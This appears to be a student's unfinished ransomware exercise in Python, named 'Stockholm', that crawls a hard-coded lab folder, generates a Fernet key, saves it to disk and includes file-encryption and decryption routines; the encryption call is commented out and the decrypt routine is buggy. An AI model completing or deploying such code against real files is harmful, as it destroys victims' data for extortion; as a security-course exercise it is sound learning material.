from art import *
import sys
import platform
import os
from cryptography.fernet import Fernet
import cryptography
from scanf import scanf


Stockholm_version = "0.1"
Folders_to_encrypt = "/home/tauer/Documents/Piscine-Cybersecurity/Stockholm/infection/"

class Stockholm :
    def __init__(self, argv):
        self.reverse = False
        self.silent = False
        self.reverse_key = None
        self.complete_files = []
        
        
        try :
            self.crawl_file()
            self.check_parameters(argv)
            if self.reverse is True:
                self.Reverse_encrypting()
            else:
                self.WannaCry()
        except Exception as e:
            print("\033[1;41m" + " " * 70 + "\033[0m")
            print(f"\033[1;41m{'ERROR:'.center(70)}\033[0m")
            print(f"\033[1;41m{str(e).center(70)}\033[0m")
            print("\033[1;41m" + " " * 70 + "\033[0m")
    
    def reverse_key_display(self, key):
        print("\033[1;42m" + " " * 50 + "\033[0m")
        print(f"\033[1;42m{'DECRYPTION KEY:'.center(50)}\033[0m")
        print(f"\033[1;42m{key.decode().center(50)}\033[0m")
        print("\033[1;42m" + " " * 50 + "\033[0m")
    
    def help(self):
        print("\033[1;36m" + text2art('''Need help buddy ?''', font="small") + "\033[0m")
        print("\033[1;32m--help or --h\033[0m: \033[1;34mdisplay help\033[0m")
        print("\033[1;32m--version or --v\033[0m: \033[1;34mshow version program\033[0m")
        print("\033[1;32m--reverse or --r <key to decrypt>\033[0m: \033[1;34mreverse the infection :3\033[0m")
        print("\033[1;32m--silent or --s\033[0m: \033[1;34mto silent showing file in terminal\033[0m\n\n")
    
    def version(self):
        system_info = platform.uname()
        print("\n\033[1;31mStockholm Version:\033[0m \033[1;37m" + Stockholm_version + "\033[0m")
        print("\033[1;31mSystem Affected:\n\t\033[0m \033[1;37m" + f"{system_info.system} {system_info.node} {system_info.release}\n\t {system_info.version} {system_info.machine}" + "\033[0m\n")
    
    def check_parameters(self, argv):
        for parameter in argv:
            if "-help" in parameter or "-h" in parameter:
                self.help()
            if "--version" in parameter or "--v" in parameter:
                self.version()
            if ("--reverse" in parameter or "--r" in parameter):
                if (argv.index(parameter) + 1 < len(argv)):
                    self.reverse = True
                    self.reverse_key = argv[argv.index(parameter) + 1]
                else :
                    raise Exception("python3 ./stockholm --r < THE KEY BABY :3 >")
            if  "--silent" in parameter or "--s" in parameter:
                self.silent = True
    
    def encrypt_file(self, file_path):
        fernet = Fernet(self.reverse_key)
        
        with open(file_path, 'rb') as file:
            original = file.read()
            
        encrypted = fernet.encrypt(original)
        
        with open(file_path, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)
    
    def crawl_file(self):
        for root, dir_names, file_names in os.walk(Folders_to_encrypt):
            for f in file_names:
                self.complete_files.append(os.path.join(root, f))
    
    def WannaCry(self):
        print(f"\033[1;31mWorking on:\033[0m {Folders_to_encrypt}\n")
        
        self.reverse_key = Fernet.generate_key()
        self.reverse_key_display(self.reverse_key)
        
        with open('filekey.key', 'wb') as filekey:
            filekey.write(self.reverse_key)
        
        # self.encrypt_file(Folders_to_encrypt)
        


        for file_path in self.complete_files:
            print(file_path)
            
         
        
    def Reverse_encrypting(self):
        
        print("reversing..")
        
        if self.reverse_key == None:
            raise Exception("failed to encrypt")
        
        try:
            fernet = Fernet(self.reverse_key)
            with open(Folders_to_encrypt, 'rb') as enc_file:
                encrypted = enc_file.read()
            decrypted = fernet.decrypt(encrypted)
        except cryptography.fernet.InvalidToken:
                raise Exception("Error: Invalid encryption key. Decryption failed.")
        
        with open(Folders_to_encrypt, 'wb') as dec_file:
            dec_file.write(decrypted)        
        
        
          
        
    
Stockholm(sys.argv)
    

    
